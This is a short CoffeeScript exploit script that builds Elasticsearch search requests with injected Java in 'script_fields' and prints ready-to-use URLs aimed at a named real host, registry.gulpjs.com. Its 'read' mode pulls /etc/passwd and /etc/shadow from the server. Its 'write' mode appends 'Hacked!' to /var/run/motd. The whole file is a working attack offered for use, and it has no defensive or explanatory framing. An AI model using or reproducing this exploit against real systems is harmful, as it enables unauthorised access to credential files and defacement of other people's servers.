args = process.argv[2]

read = (filename) ->
  return ("import java.util.*;\nimport java.io.*;\nnew Scanner(new File(\"" + filename + "\")).useDelimiter(\"\\\\Z\").next();")

write = (filename, content) ->
  return ("import java.util.*;\nimport java.io.*;\nPrintWriter writer = new PrintWriter(new BufferedWriter(new FileWriter(\"" + filename + "\", true)));\nwriter.println(\"" + content + "\");\nwriter.close();")


payload = {
  "size": 1,
  "query": {
    "filtered": {
      "query": {
        "match_all": {}
      }
    }
  },
  "script_fields": {}
}

fileList = ["/etc/passwd/", "/etc/shadow"] #, "/root/.ssh/authorized_keys"]

if args == "read"
  for filename in fileList
    payload["script_fields"][filename] = {"script": read filename }
  encoded = encodeURIComponent JSON.stringify payload
  console.log "http://registry.gulpjs.com/_search?source=#{encoded}&callback=?"

if args == "write"
  filename = "/var/run/motd"
  content = "Hacked!"
  payload["script_fields"][filename] = {"script": write filename, content }
  encoded = encodeURIComponent JSON.stringify payload
  console.log "http://registry.gulpjs.com/_search?source=#{encoded}&callback=?"
